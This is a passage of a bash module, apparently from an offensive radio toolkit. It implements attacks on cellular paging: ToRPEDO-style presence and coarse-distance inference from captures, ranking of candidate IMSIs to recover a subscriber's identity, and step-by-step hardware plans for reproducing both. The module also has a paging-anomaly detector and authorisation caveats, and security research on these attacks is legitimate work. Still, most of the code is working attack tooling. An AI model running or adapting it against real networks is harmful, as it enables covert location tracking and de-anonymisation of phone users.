        [[ -n "$itype" && -n "$ident" ]] || continue
        printf '%s\t%s\t%s\t%s\t%s\n' "$kind" "$ts" "$fn" "$itype" "$ident"
    done <<<"$raw"
}

pgt_event_count() {
    local pcap="$1"; [[ -f "$pcap" ]] || { echo 0; return; }
    pgt_events "$pcap" 2>/dev/null | grep -c . || true
}

# ── ToRPEDO (paging-collision) model ────────────────────────────────────
# The published attack (Hussain et al., NDSS 2019) works because the paging
# occasion is a function of IMSI mod 1024, so a page aimed at one identity
# wakes every identity that shares the occasion. Two consequences are modelled
# here:
#   * collision   — how many distinct identities a single paging occasion wakes
#   * presence    — whether the target answers the page, and when
# The timing of the paging response, not just its presence, is what leaks the
# target's rough distance: the response is separated from the page by the radio
# round trip plus core/processing delay. The model refuses to name a distance
# when the capture carries no response timing.
pgt_torpedo_model() {
    local pcap="${1:-}"
    local ev; ev=$(pgt_events "$pcap") || return 1
    [[ -n "$ev" ]] || { printf 'ERROR\tno paging messages in %s\n' "${pcap:-<none>}" >&2; return 1; }
    local nreq nresp
    nreq=$(printf '%s\n' "$ev"  | awk -F'\t' '$1=="request"{n++} END{print n+0}')
    nresp=$(printf '%s\n' "$ev" | awk -F'\t' '$1=="response"{n++} END{print n+0}')
    (( nreq > 0 )) || { printf 'ERROR\tno paging requests in %s\n' "$pcap" >&2; return 1; }

    printf 'model\tToRPEDO paging-occasion collision (Hussain et al., NDSS 2019)\n'
    printf 'capture\t%s\n' "$(pgt_sanitize "$pcap")"
    printf 'paging_requests\t%d\npaging_responses\t%d\n' "$nreq" "$nresp"

    # Collision: distinct identities sharing one paging occasion (frame).
    local maxcoll
    maxcoll=$(printf '%s\n' "$ev" | awk -F'\t' '$1=="request"{print $3"\t"$5}' \
              | sort -u | awk -F'\t' '{c[$1]++} END{m=0; for(k in c) if(c[k]>m) m=c[k]; print m+0}')
    printf 'max_identities_per_paging_occasion\t%s\n' "${maxcoll:-0}"
    printf 'collision_detected\t%s\n' "$([[ "${maxcoll:-0}" -gt 4 ]] && echo yes || echo no)"

    if (( nresp == 0 )); then
        printf 'status\tnot_determinable\n'
        printf 'reason\t%s\n' "capture carries paging requests but no paging responses: presence and timing are not determinable from this capture"
        return 1
    fi

    # Presence and response timing per identity.
    local ident
    while IFS= read -r ident; do
        [[ -z "$ident" ]] && continue
        local rt
        rt=$(printf '%s\n' "$ev" | awk -F'\t' -v id="$ident" '
            $1=="request"  && $5==id { if (!(id in seen)) { first[id]=$2; seen[id]=1 } }
            $1=="response" && $5==id { print $2 - first[id] }
        ' | head -n1)
        if [[ -z "$rt" ]]; then
            printf 'target\t%s\tpresent\t%s\tresponse_delay_ms\t%s\n' \
                "$(pgt_sanitize "$ident")" "no" "-"
        else
            local ms; ms=$(awk -v d="$rt" 'BEGIN{printf "%.3f", d*1000}')
            printf 'target\t%s\tpresent\tyes\tresponse_delay_ms\t%s\n' \
                "$(pgt_sanitize "$ident")" "$ms"
        fi
    done < <(printf '%s\n' "$ev" | awk -F'\t' '$1=="request"{print $5}' | sort -u)

    # Rough distance from the smallest observed response delay. Below 10 ms the
    # radio round trip can dominate; above it the estimate is processing-bound
    # and is reported as not determinable rather than as a location.
    local mind
    mind=$(printf '%s\n' "$ev" | awk -F'\t' '
        $1=="request"{f[$5]=$2; seen[$5]=1}
        $1=="response" && ($5 in seen){d=$2-f[$5]; if(m==""||d<m) m=d}
        END{if(m=="") print ""; else printf "%.6f", m}')
    if [[ -n "$mind" ]]; then
        local ms; ms=$(awk -v d="$mind" 'BEGIN{printf "%.3f", d*1000}')
        printf 'min_response_delay_ms\t%s\n' "$ms"
        if awk -v d="$mind" 'BEGIN{exit !(d < 0.010)}'; then
            local km; km=$(awk -v d="$mind" 'BEGIN{printf "%.3f", 299792.458*d/2}')
            printf 'location_estimate\tcoarse\ndistance_km_max\t%s\n' "$km"
        else
            printf 'location_estimate\tnot_determinable\n'
            printf 'location_reason\t%s\n' "response delay is processing/core dominated (>10 ms), so it is not a radio-distance measurement"
        fi
    fi

    printf 'sequence\t%s\n' "1. observe the target's paging occasion (IMSI mod 1024 -> block)"
    printf 'sequence\t%s\n' "2. cause the network to page the target (an incoming call, an SMS, a service request)"
    printf 'sequence\t%s\n' "3. co-locate the page with records for other identities sharing the occasion (collision)"
    printf 'sequence\t%s\n' "4. watch for the paging response on the shared occasion: a response proves presence"
    printf 'sequence\t%s\n' "5. compare response timing across pages to bracket the target's distance"
    printf 'status\tdeterminable\n'
    printf 'note\t%s\n' "steps 1-5 are passive observation; injecting paging records to force a collision needs a base station you are authorised to run, which this module does not build"
    return 0
}

# ── paging-based IMSI recovery ("Piercer"/IMSI-Cracking) ────────────────
# Model: the paging occasion is a function of the identity (GSM: IMSI mod 1000
# -> paging group -> block, TS 45.002 6.5.2; LTE: IMSI mod 1024 -> PF/PO). An attacker who triggers a page and
# observes WHICH occasion carries it learns the target's group, and matches it
# against a candidate set. The observed block in a capture is taken as
#   observed_block = frame_number mod blocks_per_multiframe
# with blocks_per_multiframe = BS_PA_MFRMS/2, which is the identity's paging
# block by TS 45.002 §6.5.2 when the capture's frame numbering is that of the
# paging channel.
#
# Timing budget: one observation per triggered page, and one page per paging
# occasion. An occasion recurs every BS_PA_MFRMS multiframes (GSM) or T radio
# frames (LTE). The information per observation is log2(blocks) bits (GSM) or
# log2(T) bits (LTE), so a candidate set of N identities needs
# ceil(log2(N)/log2(blocks)) GSM observations.
pgt_piercer_correlate() {
    local cands="${1:-}" pcap="${2:-}"
    [[ -f "$cands" ]] || { printf 'ERROR\tno such candidate file: %s\n' "${cands:-<none>}" >&2; return 2; }
    [[ -f "$pcap"  ]] || { printf 'ERROR\tno such capture: %s\n' "${pcap:-<none>}" >&2; return 2; }
    local mfrms="${3:-6}"
    [[ "$mfrms" =~ ^[0-9]+$ ]] || return 2
    (( mfrms >= 2 && mfrms <= 9 )) || return 2
    local blocks=$(( mfrms / 2 )); (( blocks >= 1 )) || blocks=1

    local ev; ev=$(pgt_events "$pcap") || return 1
    local req; req=$(printf '%s\n' "$ev" | awk -F'\t' '$1=="request"{print $3"\t"$5}')
    [[ -n "$req" ]] || {
        printf 'status\tnot_determinable\n'
        printf 'reason\t%s\n' "capture carries no paging-request timing, so no occasion can be attributed to a candidate"
        return 1
    }
    local observed
    observed=$(printf '%s\n' "$req" | awk -F'\t' -v b="$blocks" '{print $1 % b}' | sort -u | tr '\n' ' ')
    printf 'model\tpaging-occasion correlation (Hussain et al., NDSS 2019)\n'
    printf 'capture\t%s\ncandidates_file\t%s\nbs_pa_mfrms\t%s\nblocks_per_multiframe\t%s\nobserved_blocks\t%s\n' \
        "$(pgt_sanitize "$pcap")" "$(pgt_sanitize "$cands")" "$mfrms" "$blocks" "$(pgt_sanitize "${observed% }")"

    local total=0 line imsi grp blk score
    local -a rows
    while IFS= read -r line; do
        [[ -z "$line" ]] && continue
        # Accept a bare IMSI or a TSV first column.
        imsi=$(printf '%s' "$line" | cut -f1)
        [[ "$imsi" =~ ^[0-9]{6,15}$ ]] || continue
        total=$(( total + 1 ))
        grp=$(pgt_paging_group "$imsi") || continue
        blk=$(( grp % blocks ))
        score=0
        for ob in $observed; do
            [[ "$ob" == "$blk" ]] && score=$(( score + 1 ))
        done
        rows+=("$(printf '%d\t%s\t%s\t%s' "$score" "$imsi" "$grp" "$blk")")
    done < "$cands"
    (( total > 0 )) || { printf 'ERROR\tno IMSIs in %s\n' "$cands" >&2; return 1; }

    printf 'candidates\t%d\n' "$total"
    local ranked
    ranked=$(printf '%s\n' "${rows[@]}" | sort -t$'\t' -k1,1nr -k2,2)
    printf 'rank\tscore\timsi\tpaging_group\tblock\n'
    local r=1
    while IFS= read -r line; do
        [[ -z "$line" ]] && continue
        pgt_split "$line"
        printf '%d\t%s\t%s\t%s\t%s\n' "$r" "${PGT_F[0]}" "$(pgt_sanitize "${PGT_F[1]}")" "${PGT_F[2]}" "${PGT_F[3]}"
        r=$(( r + 1 ))
    done <<<"$ranked"

    local top; top=$(printf '%s\n' "$ranked" | head -n1 | cut -f2)
    local obs_n obs_bits cycles
    obs_n=$(printf '%s\n' "$req" | wc -l | tr -d ' ')
    obs_bits=$(awk -v b="$blocks" 'BEGIN{printf "%.2f", (b>1)?(log(b)/log(2)):0}')
    if (( blocks > 1 )); then
        cycles=$(awk -v n="$total" -v b="$blocks" 'BEGIN{printf "%d", (log(n)/log(2))/(log(b)/log(2)) + 0.999}')
    else
        cycles=0
    fi
    printf 'top_candidate\t%s\n' "$top"
    printf 'observations\t%s\nbits_per_observation\t%s\n' "$obs_n" "$obs_bits"
    if (( blocks > 1 )); then
        printf 'timing_budget_cycles\t%d\n' "$cycles"
        printf 'timing_budget_note\t%s\n' "each cycle is BS_PA_MFRMS multiframes (GSM, 51 frames each, 4.615 ms per frame); ${cycles} triggered pages are needed to separate ${total} candidates"
        printf 'status\trecovered\n'
    else
        printf 'status\tnot_determinable\n'
        printf 'reason\t%s\n' "BS_PA_MFRMS=${mfrms} gives one paging block per multiframe: the occasion carries no information about IMSI mod 1000, so candidates cannot be separated by timing alone"
        return 1
    fi
    return 0
}

# ── paging-anomaly detection ────────────────────────────────────────────
# Signals, all computed from the capture (the honest half of the attack):
#   S1 paging rate per subscriber above the observation window norm
#   S2 paging from an identity that never answers (unexpected TMSI)
#   S3 paging-record density on one occasion above the 1..4 a paging request
#      normally carries (a storm / collision)
#   S4 repeated paging with no paging response following
pgt_detect() {
    local pcap="${1:-}"
    local ev; ev=$(pgt_events "$pcap") || return 1
    [[ -n "$ev" ]] || { printf 'ERROR\tno paging messages in %s\n' "${pcap:-<none>}" >&2; return 1; }
    local nreq nresp
    nreq=$(printf '%s\n' "$ev"  | awk -F'\t' '$1=="request"{n++} END{print n+0}')
    nresp=$(printf '%s\n' "$ev" | awk -F'\t' '$1=="response"{n++} END{print n+0}')
    (( nreq > 0 )) || { printf 'ERROR\tno paging requests in %s\n' "$pcap" >&2; return 1; }

    local span
    span=$(printf '%s\n' "$ev" | awk -F'\t' 'NR==1{lo=$2;hi=$2} {if($2<lo)lo=$2; if($2>hi)hi=$2} END{printf "%.6f", hi-lo}')
    local maxsub maxcoll unanswered repeated
    maxsub=$(printf '%s\n' "$ev" | awk -F'\t' '$1=="request"{c[$5]++} END{m=0; for(k in c) if(c[k]>m)m=c[k]; print m+0}')
    maxcoll=$(printf '%s\n' "$ev" | awk -F'\t' '$1=="request"{print $3"\t"$5}' | sort -u \
              | awk -F'\t' '{c[$1]++} END{m=0; for(k in c) if(c[k]>m)m=c[k]; print m+0}')
    unanswered=$(printf '%s\n' "$ev" | awk -F'\t' '
        $1=="request"{r[$5]=1} $1=="response"{a[$5]=1}
        END{n=0; for(k in r) if(!(k in a)) n++; print n+0}')
    repeated=$(printf '%s\n' "$ev" | awk -F'\t' '
        $1=="request"{r[$5]++} $1=="response"{a[$5]=1}
        END{n=0; for(k in r) if(r[k]>=3 && !(k in a)) n++; print n+0}')

    printf 'capture\t%s\n' "$(pgt_sanitize "$pcap")"
    printf 'window_seconds\t%s\npaging_requests\t%d\npaging_responses\t%d\n' "$span" "$nreq" "$nresp"
    printf 'max_pages_per_subscriber\t%s\n' "$maxsub"
    printf 'max_records_per_occasion\t%s\n' "$maxcoll"
    printf 'identities_never_answering\t%s\n' "$unanswered"
    printf 'identities_paged_3plus_without_answer\t%s\n' "$repeated"

    local hits=0 findings=""
    if (( maxsub > 10 )); then
        hits=$(( hits + 1 )); findings+="S1 paging_rate_per_subscriber=$maxsub;"
    fi
    if (( unanswered > 50 )); then
        hits=$(( hits + 1 )); findings+="S2 unexpected_tmsi_unanswered=$unanswered;"
    fi
    if (( maxcoll > 4 )); then
        hits=$(( hits + 1 )); findings+="S3 paging_record_density=$maxcoll;"
    fi
    if (( repeated > 0 )); then
        hits=$(( hits + 1 )); findings+="S4 repeated_paging_no_answer=$repeated;"
    fi
    printf 'findings\t%s\n' "$(pgt_sanitize "${findings:-none}")"
    printf 'signal_hits\t%d\n' "$hits"
    if (( hits > 0 )); then
        printf 'verdict\tpaging_anomaly\n'
        printf 'note\t%s\n' "a paging storm is indistinguishable from an aggressive but legitimate paging load without the reference norm for the cell; the operator's own counters are the record that settles it"
        return 0
    fi
    printf 'verdict\tnormal\n'
    return 0
}

# ── plan files (handoff) ────────────────────────────────────────────────
pgt_plan() {
    local kind="${1:-}"
    case "$kind" in
        torpedo|piercer) ;;
        *) printf 'ERROR\tunknown plan: %s (want torpedo|piercer)\n' "${kind:-<none>}" >&2; return 2 ;;
    esac
    local hw ts f
    hw="a base-station testbed you are authorised to run (Osmocom osmo-bts + osmo-bsc, or srsRAN with a USRP B210 / LimeSDR), a programmable SIM, and a faraday-isolated or licensed test cell"
    ts=$(date +%Y%m%d_%H%M%S)
    mkdir -p "$PGT_PLAN_DIR"
    f="$PGT_PLAN_DIR/plan_${kind}_${ts}.txt"
    {
        echo "plan: $kind"
        echo "status: handoff"
        echo "hardware: $hw"
        echo "ts: $(date -Is)"
        echo
        if [[ "$kind" == "torpedo" ]]; then
            cat <<'EOF'
objective
  Reproduce ToRPEDO (Hussain et al., NDSS 2019): show that a paging occasion
  is a function of IMSI mod 1024, so that a small number of paging records
  wakes many identities, and that the paging response reveals presence.

why this needs hardware
  The passive half is in this module: --detect reads a capture, --po computes
  the occasion. The active half needs a base station that can send PAGING
  REQUEST messages on a chosen paging occasion. That is a transmit path with
  an operator licence, not a software step.

prerequisites
  * an authorised base-station testbed (osmo-bts + osmo-bsc, or srsRAN + USRP)
  * a test cell whose PLMN you are permitted to transmit
  * at least two programmable SIMs whose IMSIs share a paging occlusion
    (IMSI mod 1000 equal for the same BS_PA_MFRMS, TS 45.002 6.5.2), or LTE
    UEs with equal IMSI mod 1024
  * a passive receiver for the response timing (the same SDR, receive-only)

procedure
  1. Compute the occasion:  modules/28_paging_track.sh --po <imsi> <mfrms> gsm
  2. Page identity A on its occasion and record the response delay.
  3. Page identity B on the same occasion. Both wake. Record both responses.
  4. Vary the page time and compare the response delay distribution.
EOF
        else
            cat <<'EOF'
objective
  Reproduce paging-based IMSI recovery (IMSI-Cracking, Hussain et al., NDSS
  2019): trigger a page to the target, observe which paging occasion carries
  it, and match the occasion against a candidate IMSI set.

why this needs hardware
  The attacker must cause the network to page the target (an incoming call or
  SMS is enough) and must then observe the paging occasion. Observation is
  passive and legal where the spectrum is licensed to the observer; causing a
  page against a third party is not something this module does.

prerequisites
  * a passive receiver on the paging channel with frame-number accuracy
  * a way to trigger a page to the target that you are authorised to use
    (a call or SMS to the target's own number, with the target's consent)
  * a candidate IMSI set (the correlation input)

procedure
  1. Trigger one page and capture the paging occasion:
       modules/28_paging_track.sh --detect capture.pcap
  2. Correlate against the candidate set:
       modules/28_paging_track.sh --piercer-correlate candidates.txt capture.pcap 6
  3. Repeat until the top candidate is stable; the timing budget printed by
     the verb states how many triggered pages are needed.
EOF
        fi
    } | tee "$f"
    printf 'plan_file\t%s\nstatus\thandoff\n' "$f"
    return 0
}

# ── CLI verbs ───────────────────────────────────────────────────────────
pgt_cli_status_tsv() {
    local py="none" radio="none"
    command -v python3 >/dev/null 2>&1 && py="python3"
    command -v hackrf_info >/dev/null 2>&1 && radio="hackrf"
    [[ "$radio" == "none" ]] && command -v uhd_find_devices >/dev/null 2>&1 && radio="usrp"
    [[ "$radio" == "none" ]] && command -v rtl_test >/dev/null 2>&1 && radio="rtlsdr"
    printf 'module\tpaging_track\n'
    printf 'tag\tpgt\n'
    printf 'pcap_reader\t%s\n' "$py"
    printf 'radio\t%s\n' "$radio"
    printf 'dir\t%s\n' "$PGT_DIR"
    printf 'plan_dir\t%s\n' "$PGT_PLAN_DIR"
    printf 'gsm_paging_group\t%s\n' "((IMSI mod 1000) mod (BS_CC_CHANS x N)) mod N (TS 45.002 6.5.2)"
    printf 'gsm_paging_block\t%s\n' "PAGING_GROUP mod (N div BS_PA_MFRMS), N = paging blocks per 51-mf x BS_PA_MFRMS (TS 45.002 6.5.3)"
    printf 'lte_pf\t%s\n' "SFN mod T = (T div N)*(UE_ID mod N) (TS 36.304 7.2)"
    printf 'nr_pf\t%s\n' "(SFN + PF_offset) mod T = (T div N)*(UE_ID mod N) (TS 38.304 7.1)"
}

pgt_cmd_po() {
    local imsi="${1:-}" arg="${2:-}" gen="${3:-gsm}" extra="${4:-}" extra2="${5:-}"
    [[ -n "$imsi" && -n "$arg" ]] || {
        printf 'ERROR\tusage: --po <imsi> <mfrms|T> <gsm|lte|nr> [nB] [pf_offset|fdd|tdd]\n' >&2
        return 2
    }
    case "$gen" in
        gsm) pgt_gsm_params "$imsi" "$arg" "${extra:-1}" "${extra2:-false}" ;;
        lte) pgt_lte_params "$imsi" "$arg" "$extra" "${extra2:-fdd}" ;;
        nr)  pgt_nr_params  "$imsi" "$arg" "$extra" "${extra2:-0}" ;;
        *)   printf 'ERROR\tunknown generation: %s (want gsm|lte|nr)\n' "$gen" >&2; return 2 ;;
    esac
}

pgt_cmd_paging_parse() {
    local h="${1:-}" gen="${2:-gsm}"
    [[ -n "$h" ]] || { printf 'ERROR\tusage: --paging-parse <hex> [gsm|lte|nr]\n' >&2; return 2; }
    pgt_parse_paging "$gen" "$h"
}

pgt_cmd_torpedo() {
    local p="${1:-}"
    [[ -n "$p" ]] || { printf 'ERROR\tusage: --torpedo-model <pcap>\n' >&2; return 2; }
    pgt_torpedo_model "$p"
}

pgt_cmd_piercer() {
    local c="${1:-}" p="${2:-}" m="${3:-6}"
    [[ -n "$c" && -n "$p" ]] || {
        printf 'ERROR\tusage: --piercer-correlate <candidates-file> <pcap> [mfrms]\n' >&2; return 2; }
    pgt_piercer_correlate "$c" "$p" "$m"
}

pgt_cmd_detect() {
    local p="${1:-}"
    [[ -n "$p" ]] || { printf 'ERROR\tusage: --detect <pcap>\n' >&2; return 2; }
    pgt_detect "$p"
}

# ── selftest — no radio, no root, no network ────────────────────────────
pgt_selftest() {
    local bad=0 nchk=0
    chk() {
        nchk=$(( nchk + 1 ))
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$(( bad + 1 )); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    local d out rc
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    trap 'rm -rf "$d"' EXIT
    export LOOT_DIR="$d/loot" CAPTURES_DIR="$d/captures" STATE_DIR="$d/state"
    export PGT_DIR="$d/loot/paging_track"
    export PGT_PLAN_DIR="$PGT_DIR/plans"
    mkdir -p "$PGT_DIR" "$PGT_PLAN_DIR"

    # 1. GSM paging group = (IMSI mod 1000) mod N (TS 45.002 6.5.2). The base
    #    modulus is 1000 — the last three DECIMAL digits of the IMSI — not 1024.
    chk gsm-group-310150123456789 "$(pgt_paging_group 310150123456789)" "789"
    chk gsm-group-208011234567890 "$(pgt_paging_group 208011234567890)" "890"
    chk gsm-group-123456789012345 "$(pgt_paging_group 123456789012345)" "345"
    chk gsm-group-001010000000001 "$(pgt_paging_group 001010000000001)" "1"
    chk gsm-group-bad "$(pgt_paging_group not-an-imsi >/dev/null 2>&1; echo $?)" "1"
    chk gsm-group-short "$(pgt_paging_group 12345 >/dev/null 2>&1; echo $?)" "1"
    #    Regression guard for the old power-of-two modulus: 310150123456789 mod
    #    1024 = 277, and 277 must not be what this reports.
    chk gsm-group-not1024 "$([[ "$(pgt_paging_group 310150123456789)" == "277" ]] && echo yes || echo no)" "no"

    # 2. Block index = PAGING_GROUP mod pblocks, pblocks = 9 - BS_AG_BLKS_RES
    #    on a non-combined cell (TS 45.002 table 5).
    chk gsm-block-789-mfrms6 "$(pgt_paging_block 310150123456789 6)" "6"
    chk gsm-block-890-mfrms6 "$(pgt_paging_block 208011234567890 6)" "8"
    chk gsm-block-345-mfrms8 "$(pgt_paging_block 123456789012345 8)" "3"
    chk gsm-block-789-mfrms2 "$(pgt_paging_block 310150123456789 2)" "6"
    #    Combined CCCH + SDCCH/4 leaves three blocks: 789 mod 3 = 0.
    chk gsm-block-comb "$(pgt_paging_block 310150123456789 2 3 1 true)" "0"
    out=$(pgt_gsm_params 310150123456789 6 1)
    chk gsm-params-block "$(fld "$out" paging_block_index)" "5"
    chk gsm-params-ccch  "$(fld "$out" ccch_block_index)"  "6"
    chk gsm-params-bad-mfrms "$(pgt_gsm_params 310150123456789 99 >/dev/null 2>&1; echo $?)" "1"
    #    Reserving more blocks than the combined layout has must fail, not clamp.
    chk gsm-params-over-res "$(pgt_gsm_params 310150123456789 2 4 true >/dev/null 2>&1; echo $?)" "1"

    # 3. LTE PF/PO (TS 36.304 7.2, Table 7.2-1).
    out=$(pgt_lte_params 277 64 64)
    chk lte-277-64-64-n  "$(fld "$out" n)"  "64"
    chk lte-277-64-64-ns "$(fld "$out" ns)" "1"
    chk lte-277-64-64-sfn "$(fld "$out" pf_sfn)" "21"
    chk lte-277-64-64-sub "$(fld "$out" po_subframe)" "9"
    # T div N != 1: nB = T/4 = 16 -> N=16, T div N = 4, PF = 4*(277 mod 16) = 20
    out=$(pgt_lte_params 277 64 16)
    chk lte-tdivn "$(fld "$out" t_div_n)" "4"
    chk lte-tdivn-n "$(fld "$out" n)" "16"
    chk lte-tdivn-sfn "$(fld "$out" pf_sfn)" "20"
    chk lte-tdivn-sub "$(fld "$out" po_subframe)" "9"
    # Ns=2: nB = 2T -> i_s = floor(722/64) mod 2 = 1 -> subframe 9
    out=$(pgt_lte_params 722 64 128)
    chk lte-ns2 "$(fld "$out" ns)" "2"
    chk lte-ns2-is "$(fld "$out" i_s)" "1"
    chk lte-ns2-sfn "$(fld "$out" pf_sfn)" "18"
    chk lte-ns2-sub "$(fld "$out" po_subframe)" "9"
    # Ns=4: i_s = 11 mod 4 = 3 -> subframe 9 (FDD) / 6 (TDD)
    out=$(pgt_lte_params 722 64 256)
    chk lte-ns4-is "$(fld "$out" i_s)" "3"
    chk lte-ns4-tdd "$(fld "$(pgt_lte_params 722 64 256 tdd)" po_subframe)" "6"
    out=$(pgt_lte_params 889 128 128)
    chk lte-889-128-sfn "$(fld "$out" pf_sfn)" "121"
    chk lte-bad-t   "$(pgt_lte_params 277 100 100 >/dev/null 2>&1; echo $?)" "1"
    chk lte-bad-nb  "$(pgt_lte_params 277 64 7 >/dev/null 2>&1; echo $?)" "1"
    chk lte-bad-ue  "$(pgt_lte_params 5000 64 64 >/dev/null 2>&1; echo $?)" "1"

    # 4. NR PF/PO (TS 38.304 7.1).
    out=$(pgt_nr_params 277 32 32 0)
    chk nr-277-32-sfn "$(fld "$out" pf_sfn)" "21"
    chk nr-277-32-po  "$(fld "$out" po_index)" "1"
    out=$(pgt_nr_params 722 64 64 1)
    chk nr-offset-sfn "$(fld "$out" pf_sfn)" "17"
    chk nr-offset-rhs "$(fld "$out" pf_rhs)" "18"
    out=$(pgt_nr_params 277 128 32 0)
    chk nr-tdivn "$(fld "$out" t_div_n)" "4"
    chk nr-tdivn-sfn "$(fld "$out" pf_sfn)" "84"
    out=$(pgt_nr_params 722 64 128 0)
    chk nr-ns2-is "$(fld "$out" i_s)" "1"
    chk nr-ns2-po "$(fld "$out" po_index)" "2"
    chk nr-bad-off "$(pgt_nr_params 277 32 32 9 >/dev/null 2>&1; echo $?)" "1"
    chk nr-bad-t   "$(pgt_nr_params 277 50 50 >/dev/null 2>&1; echo $?)" "1"

    # 5. Mobile identity parse — libosmocore known-answer vectors.
    out=$(pgt_parse_mi 1932547698103254)
    chk mi-imsi-15-type  "$(fld "$out" identity_type)" "IMSI"
    chk mi-imsi-15-value "$(fld "$out" identity)" "123456789012345"
    out=$(pgt_parse_mi 11325476981032f4)
    chk mi-imsi-14-odd  "$(fld "$out" odd_even)" "even"
    chk mi-imsi-14-value "$(fld "$out" identity)" "12345678901234"
    out=$(pgt_parse_mi 413224f3)
    chk mi-imsi-423423 "$(fld "$out" identity)" "423423"
    out=$(pgt_parse_mi 49322453)
    chk mi-imsi-4234235 "$(fld "$out" identity)" "4234235"
    out=$(pgt_parse_mi 1a32547698103254)
    chk mi-imei-type "$(fld "$out" identity_type)" "IMEI"
    chk mi-imei-value "$(fld "$out" identity)" "123456789012345"
    out=$(pgt_parse_mi 9378563412907856f4)
    chk mi-imeisv-type "$(fld "$out" identity_type)" "IMEISV"
    chk mi-imeisv-value "$(fld "$out" identity)" "9876543210987654"
    out=$(pgt_parse_mi f4aabbccdd)
    chk mi-tmsi-type  "$(fld "$out" identity_type)" "TMSI"
    chk mi-tmsi-value "$(fld "$out" tmsi)" "0xaabbccdd"
    chk mi-bad-type "$(pgt_parse_mi 0032547698103254 >/dev/null 2>&1; echo $?)" "1"
    chk mi-bad-tmsi-len "$(pgt_parse_mi f4aabbcc >/dev/null 2>&1; echo $?)" "1"

    # 6. Paging message parse per generation.
    out=$(pgt_parse_paging gsm "0621081932547698103254")
    chk gsm-page-req-records "$(fld "$out" records)" "1"
    chk gsm-page-req-type "$(fld "$out" identity_type)" "IMSI"
    chk gsm-page-req-value "$(fld "$out" identity)" "123456789012345"
    out=$(pgt_parse_paging gsm "062105f4aabbccdd")
    chk gsm-page-tmsi-type "$(fld "$out" identity_type)" "TMSI"
    chk gsm-page-tmsi-value "$(fld "$out" tmsi)" "0xaabbccdd"
    # two records in one request: TMSI then IMSI
    out=$(pgt_parse_paging gsm "062105f4aabbccdd081932547698103254")
    chk gsm-page-two-records "$(fld "$out" records)" "2"
    # Paging Response (libosmocore): 0627 00 03 505886 04 19325476 -> IMSI 1234567
    out=$(pgt_parse_paging gsm "062700035058860419325476")
    chk gsm-page-resp-type "$(fld "$out" identity_type)" "IMSI"
    chk gsm-page-resp-value "$(fld "$out" identity)" "1234567"
    out=$(pgt_parse_paging lte "1932547698103254")
    chk lte-page-imsi "$(fld "$out" identity)" "123456789012345"
    out=$(pgt_parse_paging lte "f45a42e40412")
    chk lte-page-stmsi-type "$(fld "$out" identity_type)" "S-TMSI"
    chk lte-page-stmsi-mmec "$(fld "$out" mmec)" "0x5a"
    chk lte-page-stmsi-mtmsi "$(fld "$out" m_tmsi)" "0x42e40412"
    out=$(pgt_parse_paging nr "f4000000000001")
    chk nr-page-stmsi-type "$(fld "$out" identity_type)" "5G-S-TMSI"
    chk nr-page-stmsi-tmsi "$(fld "$out" 5g_tmsi)" "0x00000001"
    chk page-bad-gen "$(pgt_parse_paging wimax aabb >/dev/null 2>&1; echo $?)" "2"
    chk page-bad-hex "$(pgt_parse_paging gsm zz >/dev/null 2>&1; echo $?)" "2"

    # 7. Capture fixtures: the Torpedo model must say "not determinable" when
    #    the capture has no paging-response timing.
    pgt_py mkfixture "$d/normal.pcap" normal
    pgt_py mkfixture "$d/burst.pcap"  burst
    pgt_py mkfixture "$d/coll.pcap"   collision
    chk fixture-normal-events "$(pgt_event_count "$d/normal.pcap")" "8"
    chk fixture-burst-events  "$(pgt_event_count "$d/burst.pcap")"  "60"
    out=$(pgt_torpedo_model "$d/normal.pcap"); rc=$?
    chk torpedo-normal-rc     "$rc" "0"
    chk torpedo-normal-status "$(fld "$out" status)" "determinable"
    chk torpedo-normal-present "$(printf '%s\n' "$out" | awk -F'\t' '$1=="target" && $4=="yes"{n++} END{print n+0}')" "4"
    out=$(pgt_torpedo_model "$d/burst.pcap"); rc=$?
    chk torpedo-burst-rc     "$rc" "1"
    chk torpedo-burst-status "$(fld "$out" status)" "not_determinable"
    chk torpedo-burst-no-guess "$(printf '%s\n' "$out" | grep -c '^location_estimate')" "0"
    out=$(pgt_torpedo_model "$d/coll.pcap")
    chk torpedo-collision "$(fld "$out" collision_detected)" "yes"
    chk torpedo-bad-pcap "$(pgt_torpedo_model /nonexistent.pcap >/dev/null 2>&1; echo $?)" "1"

    # 8. IMSI recovery by occasion correlation. One observation cannot split
    #    candidates that share a paging block: the true IMSI must score at the
    #    top, and a candidate in a different block must score zero.
    printf '310150123456789\n208011234567890\n123456789012345\n001010000000001\n' > "$d/cands.txt"
    out=$(pgt_piercer_correlate "$d/cands.txt" "$d/normal.pcap" 6); rc=$?
    chk piercer-rc "$rc" "0"
    chk piercer-top "$(fld "$out" top_candidate | awk '{print ($1=="310150123456789"||$1=="123456789012345"||$1=="001010000000001")?"in-block":"wrong"}')" "in-block"
    chk piercer-true-score  "$(printf '%s\n' "$out" | awk -F'\t' '$3=="310150123456789"{print $2}')" "1"
    chk piercer-other-score "$(printf '%s\n' "$out" | awk -F'\t' '$3=="208011234567890"{print $2}')" "0"
    # mfrms=2 -> one block -> no information -> not determinable, non-zero.
    out=$(pgt_piercer_correlate "$d/cands.txt" "$d/normal.pcap" 2); rc=$?
    chk piercer-mfrms2-rc "$rc" "1"
    chk piercer-mfrms2-status "$(fld "$out" status)" "not_determinable"
    chk piercer-no-cands "$(pgt_piercer_correlate /nonexistent "$d/normal.pcap" >/dev/null 2>&1; echo $?)" "2"

    # 9. Paging-anomaly detector, both directions.
    out=$(pgt_detect "$d/burst.pcap")
    chk detect-burst "$(fld "$out" verdict)" "paging_anomaly"
    out=$(pgt_detect "$d/normal.pcap")
    chk detect-normal "$(fld "$out" verdict)" "normal"
    chk detect-bad "$(pgt_detect /nonexistent.pcap >/dev/null 2>&1; echo $?)" "1"

    # 10. Plans are handoff, name the radio and the layer-2 position.
    out=$(pgt_plan torpedo)
    chk plan-torpedo-status "$(printf '%s\n' "$out" | grep -c '^status: handoff')" "1"
    chk plan-torpedo-plan   "$(printf '%s\n' "$out" | grep -c '^plan_file')" "1"
    out=$(pgt_plan piercer)
